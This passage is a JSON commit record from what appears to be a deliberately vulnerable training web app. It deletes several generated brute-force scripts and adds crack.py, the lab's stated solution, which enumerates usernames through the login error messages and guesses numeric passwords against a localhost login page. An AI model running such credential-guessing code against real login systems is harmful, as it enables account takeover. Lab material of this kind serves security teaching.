\"8\", \"9\"]\n-for a in characters:\n-  for b in characters:\n-    for c in characters:\n-      temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a+b+c})\n-      if \"Incorrect password\" not in temp.text:\n-        print('Possible password: '+a+b+c)\n-        exit()\n\\ No newline at end of file\ndiff --git a\/helper\/A07_brute_force_scripts\/loop4_pass.py b\/helper\/A07_brute_force_scripts\/loop4_pass.py\ndeleted file mode 100644\nindex 56c8406..0000000\n--- a\/helper\/A07_brute_force_scripts\/loop4_pass.py\n+++ \/dev\/null\n@@ -1,10 +0,0 @@\n-import requests\n-characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-for a in characters:\n-  for b in characters:\n-    for c in characters:\n-      for d in characters:\n-        temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a+b+c+d})\n-        if \"Incorrect password\" not in temp.text:\n-          print('Possible password: '+a+b+c+d)\n-          exit()\n\\ No newline at end of file\ndiff --git a\/helper\/A07_brute_force_scripts\/loop5_pass.py b\/helper\/A07_brute_force_scripts\/loop5_pass.py\ndeleted file mode 100644\nindex 8aab589..0000000\n--- a\/helper\/A07_brute_force_scripts\/loop5_pass.py\n+++ \/dev\/null\n@@ -1,10 +0,0 @@\n-import requests\n-characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-for a in characters:\n-  for b in characters:\n-    for c in characters:\n-      for d in characters:\n-        for e in characters:\n-          temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': 'v4', 'password': a+b+c+d+e})\n-          if \"Incorrect password\" not in temp.text:\n-            print('Possible password: '+a+b+c+d+e)\ndiff --git a\/helper\/A07_brute_force_scripts\/loop6_pass.py b\/helper\/A07_brute_force_scripts\/loop6_pass.py\ndeleted file mode 100644\nindex 118d2bb..0000000\n--- a\/helper\/A07_brute_force_scripts\/loop6_pass.py\n+++ \/dev\/null\n@@ -1,11 +0,0 @@\n-import requests\n-characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-for a in characters:\n-  for b in characters:\n-    for c in characters:\n-      for d in characters:\n-        for e in characters:\n-          for f in characters:\n-            temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': 'v4', 'password': a+b+c+d+e+f})\n-            if \"Incorrect password\" not in temp.text:\n-              print('Possible password: '+a+b+c+d+e+f)\ndiff --git a\/helper\/A07_brute_force_scripts\/pass.py b\/helper\/A07_brute_force_scripts\/pass.py\ndeleted file mode 100644\nindex 1dbb533..0000000\n--- a\/helper\/A07_brute_force_scripts\/pass.py\n+++ \/dev\/null\n@@ -1,34 +0,0 @@\n-import subprocess\n-# import requests\n-\n-# temp = requests.post(\"http:\/\/localhost\/A07-authenticationFailure\/login.php\", data={\"username\": \"aaa\", \"password\": \"bbb\"})\n-# print(temp.text)\n-\n-characters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-length = 4\n-usernames = [\"bw\", \"px\", \"v4\", \"5d\"]\n-\n-for username in usernames:\n-  print(f\"Cracking user {username}:\")\n-  for i in range(0, length):\n-    loop = i+1\n-    f = open(f\"loop{str(loop)}_pass.py\", \"w\")\n-    f.writelines('import requests\\n')\n-    f.writelines('characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\\n')\n-    indent = \"\"\n-    output = \"\"\n-    for j in range(0, loop):\n-      f.writelines(f\"{indent}for {characters[j]} in characters:\\n\")\n-      indent += \"  \"\n-      output += characters[j] + \"+\"\n-    f.writelines(f\"{indent}temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={{'username': '{username}', 'password': {output[:-1]}}})\\n\")\n-    f.writelines(f\"{indent}if \\\"Incorrect password\\\" not in temp.text:\\n\")\n-    f.writelines(f\"{indent}  print('Possible password: '+{output[:-1]})\\n\")\n-    f.writelines(f\"{indent}  exit()\")\n-#    f.writelines(f\"{indent}  exit()\\n\")\n-#    f.writelines(f\"{indent}print({output[:-1]})\\n\")\n-    f.close()\n-\n-  for i in range(1, length+1):\n-#    print(i)\n-    print(subprocess.check_output(f\"python3 loop{str(i)}_pass.py\", shell=True).decode())\ndiff --git a\/helper\/A07_brute_force_scripts\/user.py b\/helper\/A07_brute_force_scripts\/user.py\ndeleted file mode 100644\nindex 9ebb2af..0000000\n--- a\/helper\/A07_brute_force_scripts\/user.py\n+++ \/dev\/null\n@@ -1,30 +0,0 @@\n-import subprocess\n-# import requests\n-\n-# temp = requests.post(\"http:\/\/localhost\/A07-authenticationFailure\/login.php\", data={\"username\": \"aaa\", \"password\": \"bbb\"})\n-# print(temp.text)\n-\n-characters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-length = 2\n-\n-for i in range(0, length):\n-  loop = i+1\n-  f = open(f\"loop{str(loop)}_user.py\", \"w\")\n-  f.writelines('import requests\\n')\n-  f.writelines('characters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\\n')\n-  indent = \"\"\n-  output = \"\"\n-  for j in range(0, loop):\n-    f.writelines(f\"{indent}for {characters[j]} in characters:\\n\")\n-    indent += \"  \"\n-    output += characters[j] + \"+\"\n-  f.writelines(f\"{indent}temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={{'username': {output[:-1]}, 'password': '123'}})\\n\")\n-  f.writelines(f\"{indent}if \\\"User doesn't exist\\\" not in temp.text:\\n\")\n-  f.writelines(f\"{indent}  print('Possible username: '+{output[:-1]})\\n\")\n-#  f.writelines(f\"{indent}  exit()\\n\")\n-#  f.writelines(f\"{indent}print({output[:-1]})\\n\")\n-  f.close()\n-\n-for i in range(1, length+1):\n-#  print(i)\n-  print(subprocess.check_output(f\"python3 loop{str(i)}_user.py\", shell=True).decode())\ndiff --git a\/helper\/crack.py b\/helper\/crack.py\nnew file mode 100644\nindex 0000000..0a7c568\n--- \/dev\/null\n+++ b\/helper\/crack.py\n@@ -0,0 +1,42 @@\n+import os\n+import subprocess\n+import requests\n+import itertools\n+\n+username_length = 2\n+password_legnth = 4\n+\n+username_characters = []\n+for i in range(48, 58):\n+  username_characters.append(chr(i))\n+for i in range(65, 91):\n+  username_characters.append(chr(i))\n+  username_characters.append(chr(i+32))\n+# print(username_characters)\n+\n+password_characters = []\n+for i in range(48, 58):\n+  password_characters.append(chr(i))\n+# print(password_characters)\n+\n+def crack_password(username):\n+  for i in range(0, password_legnth):\n+    for password in itertools.product(password_characters, repeat=i+1):\n+        temp = requests.post(\"http:\/\/localhost\/A07-authenticationFailure\/login.php\", data={\"username\": username, \"password\": ''.join(password)})\n+        if \"Incorrect password\" not in temp.text:\n+          print(f\"Possible password for [{username}]: {''.join(password)}\")\n+          return\n+  return\n+\n+def crack_username():\n+  for i in range(0, username_length):\n+    for username in itertools.product(username_characters, repeat=i+1):\n+        temp = requests.post(\"http:\/\/localhost\/A07-authenticationFailure\/login.php\", data={\"username\": ''.join(username), \"password\": \"temp\"})\n+        # print(temp.text)\n+        if \"User doesn't exist\" not in temp.text:\n+          print(f\"Possible username: {''.join(username)}\")\n+          crack_password(''.join(username))\n+  return \n+\n+if __name__ == \"__main__\":\n+    crack_username()\ndiff --git a\/helper\/readme.md b\/helper\/readme.md\nindex 86597b5..edfde27 100644\n--- a\/helper\/readme.md\n+++ b\/helper\/readme.md\n@@ -3,5 +3,5 @@\n ## populateUsers.php\n Useful when populating a large amount of dummy user data\n \n-## A07_brute_force_scripts\n+## crack.py\n The solution for A07 brute force\n\\ No newline at end of file\n","files":{"\/helper\/A07_brute_force_scripts\/loop1_pass.py":{"changes":[{"diff":"\n-import requests\n-characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-for a in characters:\n-  temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a})\n-  if \"Incorrect password\" not in temp.text:\n-    print('Possible password: '+a)\n-    exit()\n\\ No newline at end of file","add":0,"remove":7,"filename":"\/helper\/A07_brute_force_scripts\/loop1_pass.py","badparts":["import requests","characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]","for a in characters:","  temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a})","  if \"Incorrect password\" not in temp.text:","    print('Possible password: '+a)","    exit()"],"goodparts":[]}],"source":"\nimport requests characters=[\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"] for a in characters: temp=requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a}) if \"Incorrect password\" not in temp.text: print('Possible password: '+a) exit() ","sourceWithComments":"import requests\ncharacters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\nfor a in characters:\n  temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a})\n  if \"Incorrect password\" not in temp.text:\n    print('Possible password: '+a)\n    exit()"},"\/helper\/A07_brute_force_scripts\/loop1_user.py":{"changes":[{"diff":"\n-import requests\n-characters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-for a in characters:\n-  temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': a, 'password': '123'})\n-  if \"User doesn't exist\" not in temp.text:\n-    print('Possible username: '+a","add":0,"remove":6,"filename":"\/helper\/A07_brute_force_scripts\/loop1_user.py","badparts":["import requests","characters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]","for a in characters:","  temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': a, 'password': '123'})","  if \"User doesn't exist\" not in temp.text:","    print('Possible username: '+a"],"goodparts":[]}],"source":"\nimport requests characters=[\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"] for a in characters: temp=requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': a, 'password': '123'}) if \"User doesn't exist\" not in temp.text: print('Possible username: '+a) ","sourceWithComments":"import requests\ncharacters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\nfor a in characters:\n  temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': a, 'password': '123'})\n  if \"User doesn't exist\" not in temp.text:\n    print('Possible username: '+a)\n"},"\/helper\/A07_brute_force_scripts\/loop2_pass.py":{"changes":[{"diff":"\n-import requests\n-characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-for a in characters:\n-  for b in characters:\n-    temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a+b})\n-    if \"Incorrect password\" not in temp.text:\n-      print('Possible password: '+a+b)\n-      exit()\n\\ No newline at end of fi","add":0,"remove":8,"filename":"\/helper\/A07_brute_force_scripts\/loop2_pass.py","badparts":["import requests","characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]","for a in characters:","  for b in characters:","    temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a+b})","    if \"Incorrect password\" not in temp.text:","      print('Possible password: '+a+b)","      exit()"],"goodparts":[]}],"source":"\nimport requests characters=[\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"] for a in characters: for b in characters: temp=requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a+b}) if \"Incorrect password\" not in temp.text: print('Possible password: '+a+b) exit() ","sourceWithComments":"import requests\ncharacters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\nfor a in characters:\n  for b in characters:\n    temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a+b})\n    if \"Incorrect password\" not in temp.text:\n      print('Possible password: '+a+b)\n      exit()"},"\/helper\/A07_brute_force_scripts\/loop2_user.py":{"changes":[{"diff":"\n-import requests\n-characters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-for a in characters:\n-  for b in characters:\n-    temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': a+b, 'password': '123'})\n-    if \"User doesn't exist\" not in temp.text:\n-      print('Possible username: '+a","add":0,"remove":7,"filename":"\/helper\/A07_brute_force_scripts\/loop2_user.py","badparts":["import requests","characters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]","for a in characters:","  for b in characters:","    temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': a+b, 'password': '123'})","    if \"User doesn't exist\" not in temp.text:","      print('Possible username: '+a"],"goodparts":[]}],"source":"\nimport requests characters=[\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"] for a in characters: for b in characters: temp=requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': a+b, 'password': '123'}) if \"User doesn't exist\" not in temp.text: print('Possible username: '+a+b) ","sourceWithComments":"import requests\ncharacters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\nfor a in characters:\n  for b in characters:\n    temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': a+b, 'password': '123'})\n    if \"User doesn't exist\" not in temp.text:\n      print('Possible username: '+a+b)\n"},"\/helper\/A07_brute_force_scripts\/loop3_pass.py":{"changes":[{"diff":"\n-import requests\n-characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-for a in characters:\n-  for b in characters:\n-    for c in characters:\n-      temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a+b+c})\n-      if \"Incorrect password\" not in temp.text:\n-        print('Possible password: '+a+b+c)\n-        exit()\n\\ No newline at end of ","add":0,"remove":9,"filename":"\/helper\/A07_brute_force_scripts\/loop3_pass.py","badparts":["import requests","characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]","for a in characters:","  for b in characters:","    for c in characters:","      temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a+b+c})","      if \"Incorrect password\" not in temp.text:","        print('Possible password: '+a+b+c)","        exit()"],"goodparts":[]}],"source":"\nimport requests characters=[\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"] for a in characters: for b in characters: for c in characters: temp=requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a+b+c}) if \"Incorrect password\" not in temp.text: print('Possible password: '+a+b+c) exit() ","sourceWithComments":"import requests\ncharacters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\nfor a in characters:\n  for b in characters:\n    for c in characters:\n      temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a+b+c})\n      if \"Incorrect password\" not in temp.text:\n        print('Possible password: '+a+b+c)\n        exit()"},"\/helper\/A07_brute_force_scripts\/loop4_pass.py":{"changes":[{"diff":"\n-import requests\n-characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-for a in characters:\n-  for b in characters:\n-    for c in characters:\n-      for d in characters:\n-        temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a+b+c+d})\n-        if \"Incorrect password\" not in temp.text:\n-          print('Possible password: '+a+b+c+d)\n-          exit()\n\\ No newline at end of","add":0,"remove":10,"filename":"\/helper\/A07_brute_force_scripts\/loop4_pass.py","badparts":["import requests","characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]","for a in characters:","  for b in characters:","    for c in characters:","      for d in characters:","        temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a+b+c+d})","        if \"Incorrect password\" not in temp.text:","          print('Possible password: '+a+b+c+d)","          exit()"],"goodparts":[]}],"source":"\nimport requests characters=[\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"] for a in characters: for b in characters: for c in characters: for d in characters: temp=requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a+b+c+d}) if \"Incorrect password\" not in temp.text: print('Possible password: '+a+b+c+d) exit() ","sourceWithComments":"import requests\ncharacters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\nfor a in characters:\n  for b in characters:\n    for c in characters:\n      for d in characters:\n        temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': '5d', 'password': a+b+c+d})\n        if \"Incorrect password\" not in temp.text:\n          print('Possible password: '+a+b+c+d)\n          exit()"},"\/helper\/A07_brute_force_scripts\/loop5_pass.py":{"changes":[{"diff":"\n-import requests\n-characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-for a in characters:\n-  for b in characters:\n-    for c in characters:\n-      for d in characters:\n-        for e in characters:\n-          temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': 'v4', 'password': a+b+c+d+e})\n-          if \"Incorrect password\" not in temp.text:\n-            print('Possible password: '+a+b+","add":0,"remove":10,"filename":"\/helper\/A07_brute_force_scripts\/loop5_pass.py","badparts":["import requests","characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]","for a in characters:","  for b in characters:","    for c in characters:","      for d in characters:","        for e in characters:","          temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': 'v4', 'password': a+b+c+d+e})","          if \"Incorrect password\" not in temp.text:","            print('Possible password: '+a+b+"],"goodparts":[]}],"source":"\nimport requests characters=[\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"] for a in characters: for b in characters: for c in characters: for d in characters: for e in characters: temp=requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': 'v4', 'password': a+b+c+d+e}) if \"Incorrect password\" not in temp.text: print('Possible password: '+a+b+c+d+e) ","sourceWithComments":"import requests\ncharacters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\nfor a in characters:\n  for b in characters:\n    for c in characters:\n      for d in characters:\n        for e in characters:\n          temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': 'v4', 'password': a+b+c+d+e})\n          if \"Incorrect password\" not in temp.text:\n            print('Possible password: '+a+b+c+d+e)\n"},"\/helper\/A07_brute_force_scripts\/loop6_pass.py":{"changes":[{"diff":"\n-import requests\n-characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-for a in characters:\n-  for b in characters:\n-    for c in characters:\n-      for d in characters:\n-        for e in characters:\n-          for f in characters:\n-            temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': 'v4', 'password': a+b+c+d+e+f})\n-            if \"Incorrect password\" not in temp.text:\n-              print('Possible password: '+a+b+c","add":0,"remove":11,"filename":"\/helper\/A07_brute_force_scripts\/loop6_pass.py","badparts":["import requests","characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]","for a in characters:","  for b in characters:","    for c in characters:","      for d in characters:","        for e in characters:","          for f in characters:","            temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': 'v4', 'password': a+b+c+d+e+f})","            if \"Incorrect password\" not in temp.text:","              print('Possible password: '+a+b+c"],"goodparts":[]}],"source":"\nimport requests characters=[\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"] for a in characters: for b in characters: for c in characters: for d in characters: for e in characters: for f in characters: temp=requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': 'v4', 'password': a+b+c+d+e+f}) if \"Incorrect password\" not in temp.text: print('Possible password: '+a+b+c+d+e+f) ","sourceWithComments":"import requests\ncharacters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\nfor a in characters:\n  for b in characters:\n    for c in characters:\n      for d in characters:\n        for e in characters:\n          for f in characters:\n            temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={'username': 'v4', 'password': a+b+c+d+e+f})\n            if \"Incorrect password\" not in temp.text:\n              print('Possible password: '+a+b+c+d+e+f)\n"},"\/helper\/A07_brute_force_scripts\/pass.py":{"changes":[{"diff":"\n-import subprocess\n-# import requests\n-\n-# temp = requests.post(\"http:\/\/localhost\/A07-authenticationFailure\/login.php\", data={\"username\": \"aaa\", \"password\": \"bbb\"})\n-# print(temp.text)\n-\n-characters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\n-length = 4\n-usernames = [\"bw\", \"px\", \"v4\", \"5d\"]\n-\n-for username in usernames:\n-  print(f\"Cracking user {username}:\")\n-  for i in range(0, length):\n-    loop = i+1\n-    f = open(f\"loop{str(loop)}_pass.py\", \"w\")\n-    f.writelines('import requests\\n')\n-    f.writelines('characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\\n')\n-    indent = \"\"\n-    output = \"\"\n-    for j in range(0, loop):\n-      f.writelines(f\"{indent}for {characters[j]} in characters:\\n\")\n-      indent += \"  \"\n-      output += characters[j] + \"+\"\n-    f.writelines(f\"{indent}temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={{'username': '{username}', 'password': {output[:-1]}}})\\n\")\n-    f.writelines(f\"{indent}if \\\"Incorrect password\\\" not in temp.text:\\n\")\n-    f.writelines(f\"{indent}  print('Possible password: '+{output[:-1]})\\n\")\n-    f.writelines(f\"{indent}  exit()\")\n-#    f.writelines(f\"{indent}  exit()\\n\")\n-#    f.writelines(f\"{indent}print({output[:-1]})\\n\")\n-    f.close()\n-\n-  for i in range(1, length+1):\n-#    print(i)\n-    print(subprocess.check_output(f\"python3 loop{str(i)}_pass.py\", shell=True).d","add":0,"remove":34,"filename":"\/helper\/A07_brute_force_scripts\/pass.py","badparts":["import subprocess","characters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]","length = 4","usernames = [\"bw\", \"px\", \"v4\", \"5d\"]","for username in usernames:","  print(f\"Cracking user {username}:\")","  for i in range(0, length):","    loop = i+1","    f = open(f\"loop{str(loop)}_pass.py\", \"w\")","    f.writelines('import requests\\n')","    f.writelines('characters = [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\\n')","    indent = \"\"","    output = \"\"","    for j in range(0, loop):","      f.writelines(f\"{indent}for {characters[j]} in characters:\\n\")","      indent += \"  \"","      output += characters[j] + \"+\"","    f.writelines(f\"{indent}temp = requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={{'username': '{username}', 'password': {output[:-1]}}})\\n\")","    f.writelines(f\"{indent}if \\\"Incorrect password\\\" not in temp.text:\\n\")","    f.writelines(f\"{indent}  print('Possible password: '+{output[:-1]})\\n\")","    f.writelines(f\"{indent}  exit()\")","    f.close()","  for i in range(1, length+1):","    print(subprocess.check_output(f\"python3 loop{str(i)}_pass.py\", shell=True).d"],"goodparts":[]}],"source":"\nimport subprocess characters=[\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"] length=4 usernames=[\"bw\", \"px\", \"v4\", \"5d\"] for username in usernames: print(f\"Cracking user{username}:\") for i in range(0, length): loop=i+1 f=open(f\"loop{str(loop)}_pass.py\", \"w\") f.writelines('import requests\\n') f.writelines('characters=[\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\\n') indent=\"\" output=\"\" for j in range(0, loop): f.writelines(f\"{indent}for{characters[j]} in characters:\\n\") indent +=\" \" output +=characters[j] +\"+\" f.writelines(f\"{indent}temp=requests.post('http:\/\/localhost\/A07-authenticationFailure\/login.php', data={{'username': '{username}', 'password':{output[:-1]}}})\\n\") f.writelines(f\"{indent}if \\\"Incorrect password\\\" not in temp.text:\\n\") f.writelines(f\"{indent} print('Possible password: '+{output[:-1]})\\n\") f.writelines(f\"{indent} exit()\") f.close() for i in range(1, length+1): print(subprocess.check_output(f\"python3 loop{str(i)}_pass.py\", shell=True).decode()) ","sourceWithComments":"import subprocess\n# import requests\n\n# temp = requests.post(\"http:\/\/localhost\/A07-authenticationFailure\/login.php\", data={\"username\": \"aaa\", \"password\": \"bbb\"})\n# print(temp.text)\n\ncharacters = [\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\", \"h\", \"i\", \"j\", \"k\", \"l\", \"m\", \"n\", \"o\", \"p\", \"q\", \"r\", \"s\", \"t\", \"u\", \"v\", \"w\", \"x\", \"y\", \"z\", \"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"]\nlength = 4\nusernames = [\"bw\", \"px\", \"v4\", \"5d\"]\n\nfor username in usernames:\n  print(f\"Cracking user {username}:\")\n  for i in range(0, length):\n    loop = i+1\n    f = 